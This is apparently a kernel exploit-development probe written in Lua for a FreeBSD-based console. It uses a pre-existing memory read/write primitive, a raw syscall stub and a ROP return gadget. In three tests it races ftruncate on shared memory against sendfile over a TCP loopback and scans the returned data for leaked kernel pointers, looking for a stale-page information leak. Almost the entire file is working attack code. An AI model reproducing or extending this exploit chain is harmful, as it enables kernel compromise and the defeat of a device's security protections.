-- CRASH_CLASS: MODERATE
-- PROBE 94d: sendfile on shm via TCP loopback + ftruncate race (with watchdog)
--
-- 94c: sendfile blocks on unix socketpair even with FIONBIO.
-- 95a: setitimer SIGALRM watchdog interrupts blocking syscalls after timeout.
-- 391a-391d: sendfile works on TCP sockets with interleaved drain.
-- This probe: TCP loopback sendfile on shm, then ftruncate race.
-- Protected by 5s SIGALRM watchdog so hangs can't kill the loader.

print("=== PROBE 94d: SENDFILE TCP + FTRUNCATE RACE ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    local n = N(val)
    if n < 0 then n = n + 0x100000000 end
    return n, 0
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)

-- Get eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
local ret_gadget = uint64(string.format("0x%X%08X", eb_hi, eb_lo + 0x42))

-- Install SIGALRM handler (bare ret) and ignore SIGSYS
local sa = memory.alloc(64)
wq(N(sa), ret_gadget); wd(N(sa)+8, 0)
for j = 12, 28, 4 do wd(N(sa)+j, 0) end
pcall(function() mk(416)(uint64(14), sa, uint64(0)) end)
wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)
print("handlers installed")

local function arm_watchdog(secs)
    local itv = memory.alloc(64)
    wq(N(itv), uint64(0)); wq(N(itv)+8, uint64(0))
    wq(N(itv)+16, uint64(secs)); wq(N(itv)+24, uint64(0))
    pcall(function() mk(83)(uint64(0), itv, uint64(0)) end)
end

local function disarm_watchdog()
    local itv = memory.alloc(64)
    for j = 0, 60, 4 do wd(N(itv)+j, 0) end
    pcall(function() mk(83)(uint64(0), itv, uint64(0)) end)
end

local function make_tcp_pair()
    local lsock_ok, lsock_rv = pcall(function()
        return mk(97)(uint64(2), uint64(1), uint64(0))
    end)
    local lsock = lsock_ok and N(lsock_rv) or -1
    if lsock >= 0x80000000 then lsock = lsock - 0x100000000 end
    if lsock < 0 then return nil end

    local addr = memory.alloc(16)
    wd(N(addr), 0x00000210); wd(N(addr)+4, 0x0100007F)
    wd(N(addr)+8, 0); wd(N(addr)+12, 0)
    pcall(function() mk(104)(uint64(lsock), uint64(N(addr)), uint64(16)) end)

    local gaddr = memory.alloc(16); local glen = memory.alloc(4); wd(N(glen), 16)
    pcall(function() mk(32)(uint64(lsock), uint64(N(gaddr)), uint64(N(glen))) end)
    local port_raw = rd(N(gaddr)+2) or 0
    pcall(function() mk(106)(uint64(lsock), uint64(5)) end)

    local csock_ok, csock_rv = pcall(function()
        return mk(97)(uint64(2), uint64(1), uint64(0))
    end)
    local csock = csock_ok and N(csock_rv) or -1
    if csock >= 0x80000000 then csock = csock - 0x100000000 end
    if csock < 0 then pcall(function() mk(6)(uint64(lsock)) end); return nil end

    local caddr = memory.alloc(16)
    wd(N(caddr), 0x00000210); wd(N(caddr)+2, port_raw)
    wd(N(caddr)+4, 0x0100007F); wd(N(caddr)+8, 0); wd(N(caddr)+12, 0)
    pcall(function() mk(98)(uint64(csock), uint64(N(caddr)), uint64(16)) end)

    local asock_ok, asock_rv = pcall(function()
        return mk(30)(uint64(lsock), uint64(0), uint64(0))
    end)
    local asock = asock_ok and N(asock_rv) or -1
    if asock >= 0x80000000 then asock = asock - 0x100000000 end

    pcall(function() mk(6)(uint64(lsock)) end)
    if asock < 0 then pcall(function() mk(6)(uint64(csock)) end); return nil end

    return csock, asock
end

-- ====== TEST A: TCP sendfile baseline ======
print("")
print("--- A: TCP sendfile baseline ---")
do
    local ok_s, rv_s = pcall(function()
        return mk(482)(uint64(1), uint64(2), uint64(0x1FF))
    end)
    local shm_fd = ok_s and N(rv_s) or -1
    if shm_fd >= 0x80000000 then shm_fd = shm_fd - 0x100000000 end

    if shm_fd >= 0 then
        pcall(function() mk(480)(uint64(shm_fd), uint64(0x10000)) end)

        local ok_m, rv_m = pcall(function()
            return mk(477)(uint64(0), uint64(0x10000), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
        end)
        if ok_m then
            local ml, mh = split(rv_m)
            if mh < 0xFFFF then
                for p = 0, 3 do
                    pcall(function()
                        memory.write_dword(uint64(string.format("0x%X%08X", mh, ml + p*0x4000)), 0xCAFE0000+p)
                    end)
                end
            end
        end

        local csock, asock = make_tcp_pair()
        if csock then
            -- Increase SO_SNDBUF
            local sndbuf = memory.alloc(4); wd(N(sndbuf), 0x40000)
            pcall(function() mk(105)(uint64(csock), uint64(0xFFFF), uint64(0x1001), uint64(N(sndbuf)), uint64(4)) end)

            arm_watchdog(5)
            local sbytes = memory.alloc(8); wq(N(sbytes), uint64(0))
            local ok_sf, rv_sf = pcall(function()
                return mk(393)(uint64(shm_fd), uint64(csock), uint64(0), uint64(0x10000), uint64(0), uint64(N(sbytes)))
            end)
            disarm_watchdog()
            local sf_ret = ok_sf and N(rv_sf) or -999
            if sf_ret >= 0x80000000 then sf_ret = sf_ret - 0x100000000 end
            local sent = rd(N(sbytes)) or 0
            if sent < 0 then sent = sent + 0x100000000 end
            print(string.format("sendfile ret=%d sent=%d", sf_ret, sent))

            -- Read from accepted socket
            local rbuf = memory.alloc(0x10000)
            local total = 0
            for attempt = 1, 20 do
                arm_watchdog(3)
                local ok_r, rv_r = pcall(function()
                    return mk(3)(uint64(asock), uint64(N(rbuf)+total), uint64(0x10000-total))
                end)
                disarm_watchdog()
                local chunk = ok_r and N(rv_r) or 0
                if chunk >= 0x80000000 then chunk = chunk - 0x100000000 end
                if chunk <= 0 then break end
                total = total + chunk
            end
            print(string.format("total_read=%d", total))

            -- Scan for kernel pointers
            local kp = 0
            for j = 0, math.min(total-1, 0xFFFC), 4 do
                local lo = rd(N(rbuf)+j) or 0
                local hi = rd(N(rbuf)+j+4) or 0
                if lo < 0 then lo = lo + 0x100000000 end
                if hi < 0 then hi = hi + 0x100000000 end
                if hi >= 0xFFFF8000 and hi < 0xFFFFFF00 then
                    print(string.format("  KPTR +%04X: 0x%08X%08X", j, hi, lo))
                    kp = kp + 1
                end
            end
            for p = 0, math.min(math.floor(total/0x4000)-1, 3) do
                local v = rd(N(rbuf) + p*0x4000) or 0
                if v < 0 then v = v + 0x100000000 end
                print(string.format("  page%d=0x%08X", p, v))
            end
            print("kptrs=" .. kp)

            pcall(function() mk(6)(uint64(asock)) end)
            pcall(function() mk(6)(uint64(csock)) end)
        end
        pcall(function() mk(6)(uint64(shm_fd)) end)
    end
end

-- ====== TEST B: sendfile then ftruncate(0) - stale page read ======
print("")
print("--- B: sendfile then ftruncate(0) ---")
do
    local ok_s, rv_s = pcall(function()
        return mk(482)(uint64(1), uint64(2), uint64(0x1FF))
    end)
    local shm_fd = ok_s and N(rv_s) or -1
    if shm_fd >= 0x80000000 then shm_fd = shm_fd - 0x100000000 end

    if shm_fd >= 0 then
        pcall(function() mk(480)(uint64(shm_fd), uint64(0x10000)) end)

        local ok_m, rv_m = pcall(function()
            return mk(477)(uint64(0), uint64(0x10000), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
        end)
        if ok_m then
            local ml, mh = split(rv_m)
            if mh < 0xFFFF then
                for p = 0, 3 do
                    pcall(function()
                        memory.write_dword(uint64(string.format("0x%X%08X", mh, ml + p*0x4000)), 0xDEAD0000+p)
                    end)
                end
            end
        end

        local csock, asock = make_tcp_pair()
        if csock then
            local sndbuf = memory.alloc(4); wd(N(sndbuf), 0x40000)
            pcall(function() mk(105)(uint64(csock), uint64(0xFFFF), uint64(0x1001), uint64(N(sndbuf)), uint64(4)) end)

            arm_watchdog(5)
            local sbytes = memory.alloc(8); wq(N(sbytes), uint64(0))
            local ok_sf, rv_sf = pcall(function()
                return mk(393)(uint64(shm_fd), uint64(csock), uint64(0), uint64(0x10000), uint64(0), uint64(N(sbytes)))
            end)
            disarm_watchdog()
            local sf_ret = ok_sf and N(rv_sf) or -999
            if sf_ret >= 0x80000000 then sf_ret = sf_ret - 0x100000000 end
            local sent = rd(N(sbytes)) or 0
            if sent < 0 then sent = sent + 0x100000000 end
            print(string.format("sendfile ret=%d sent=%d", sf_ret, sent))

            -- Ftruncate to 0 AFTER sendfile -- pages freed but data in socket buffer
            local ok_t, rv_t = pcall(function() return mk(480)(uint64(shm_fd), uint64(0)) end)
            local t_ret = ok_t and N(rv_t) or -999
            if t_ret >= 0x80000000 then t_ret = t_ret - 0x100000000 end
            print("ftruncate(0)=" .. t_ret)

            -- Read the data from socket buffer
            local rbuf = memory.alloc(0x10000)
            for j = 0, 0xFFFC, 4 do wd(N(rbuf)+j, 0xBBBBBBBB) end
            local total = 0
            for attempt = 1, 30 do
                arm_watchdog(3)
                local ok_r, rv_r = pcall(function()
                    return mk(3)(uint64(asock), uint64(N(rbuf)+total), uint64(0x10000-total))
                end)
                disarm_watchdog()
                local chunk = ok_r and N(rv_r) or 0
                if chunk >= 0x80000000 then chunk = chunk - 0x100000000 end
                if chunk <= 0 then break end
                total = total + chunk
            end
            print(string.format("total_read=%d", total))

            local kp = 0
            for j = 0, math.min(total-1, 0xFFFC), 4 do
                local lo = rd(N(rbuf)+j) or 0
                local hi = rd(N(rbuf)+j+4) or 0
                if lo < 0 then lo = lo + 0x100000000 end
                if hi < 0 then hi = hi + 0x100000000 end
                if hi >= 0xFFFF8000 and hi < 0xFFFFFF00 then
                    print(string.format("  KPTR +%04X: 0x%08X%08X", j, hi, lo))
                    kp = kp + 1
                end
            end
            local unexpected = 0
            for p = 0, math.min(math.floor(total / 0x4000), 3) do
                local v = rd(N(rbuf) + p * 0x4000) or 0
                if v < 0 then v = v + 0x100000000 end
                if v ~= 0xDEAD0000 + p and v ~= 0 and v ~= 0xBBBBBBBB then
                    print(string.format("  UNEXPECTED page%d: 0x%08X", p, v))
                    unexpected = unexpected + 1
                end
                print(string.format("  page%d=0x%08X", p, v))
            end
            print(string.format("kptrs=%d unexpected=%d", kp, unexpected))

            pcall(function() mk(6)(uint64(asock)) end)
            pcall(function() mk(6)(uint64(csock)) end)
        end
        pcall(function() mk(6)(uint64(shm_fd)) end)
    end
end

-- ====== TEST C: RACE - ftruncate DURING sendfile (large shm) ======
print("")
print("--- C: ftruncate during large sendfile ---")
do
    local ok_s, rv_s = pcall(function()
        return mk(482)(uint64(1), uint64(2), uint64(0x1FF))
    end)
    local shm_fd = ok_s and N(rv_s) or -1
    if shm_fd >= 0x80000000 then shm_fd = shm_fd - 0x100000000 end

    if shm_fd >= 0 then
        -- 1MB shm with markers every 16KB
        pcall(function() mk(480)(uint64(shm_fd), uint64(0x100000)) end)
        local ok_m, rv_m = pcall(function()
            return mk(477)(uint64(0), uint64(0x100000), uint64(3), uint64(1), uint64(shm_fd), uint64(0))
        end)
        if ok_m then
            local ml, mh = split(rv_m)
            if mh < 0xFFFF then
                for p = 0, 63 do
                    pcall(function()
                        memory.write_dword(uint64(string.format("0x%X%08X", mh, ml + p*0x4000)), 0xFACE0000+p)
                    end)
                end
            end
        end

        -- Do 5 race rounds
        for round = 1, 5 do
            local csock, asock = make_tcp_pair()
            if not csock then break end

            local sndbuf = memory.alloc(4); wd(N(sndbuf), 0x10000)  -- small 64KB sndbuf
            pcall(function() mk(105)(uint64(csock), uint64(0xFFFF), uint64(0x1001), uint64(N(sndbuf)), uint64(4)) end)

            arm_watchdog(5)

            -- sendfile 1MB -- will block when socket buffer fills
            local sbytes = memory.alloc(8); wq(N(sbytes), uint64(0))
            local ok_sf, rv_sf = pcall(function()
                return mk(393)(uint64(shm_fd), uint64(csock), uint64(0), uint64(0x100000), uint64(0), uint64(N(sbytes)))
            end)
            disarm_watchdog()
            local sf_ret = ok_sf and N(rv_sf) or -999
            if sf_ret >= 0x80000000 then sf_ret = sf_ret - 0x100000000 end
            local sent = rd(N(sbytes)) or 0
            if sent < 0 then sent = sent + 0x100000000 end

            -- ftruncate to 0 while some data might still be referencing pages
            pcall(function() mk(480)(uint64(shm_fd), uint64(0)) end)

            -- Drain and scan
            local rbuf = memory.alloc(0x100000)
            local total = 0
            for attempt = 1, 100 do
                arm_watchdog(2)
                local ok_r, rv_r = pcall(function()
                    return mk(3)(uint64(asock), uint64(N(rbuf)+total), uint64(0x100000-total))
                end)
                disarm_watchdog()
                local chunk = ok_r and N(rv_r) or 0
                if chunk >= 0x80000000 then chunk = chunk - 0x100000000 end
                if chunk <= 0 then break end
                total = total + chunk
            end

            local kp = 0
            for j = 0, math.min(total-1, 0xFFFC), 8 do
                local lo = rd(N(rbuf)+j) or 0
                local hi = rd(N(rbuf)+j+4) or 0
                if lo < 0 then lo = lo + 0x100000000 end
                if hi < 0 then hi = hi + 0x100000000 end
                if hi >= 0xFFFF8000 and hi < 0xFFFFFF00 then
                    print(string.format("  R%d KPTR +%04X: 0x%08X%08X", round, j, hi, lo))
                    kp = kp + 1
                end
            end
            print(string.format("R%d: sf_ret=%d sent=%d read=%d kptrs=%d", round, sf_ret, sent, total, kp))

            -- Re-extend shm for next round
            pcall(function() mk(480)(uint64(shm_fd), uint64(0x100000)) end)

            pcall(function() mk(6)(uint64(asock)) end)
            pcall(function() mk(6)(uint64(csock)) end)
        end

        pcall(function() mk(6)(uint64(shm_fd)) end)
    end
end

print("")
print("alive=" .. tostring(N(native.fcall_with_rax(stub, 20)) == pid_val))
print("=== 94d COMPLETE ===")
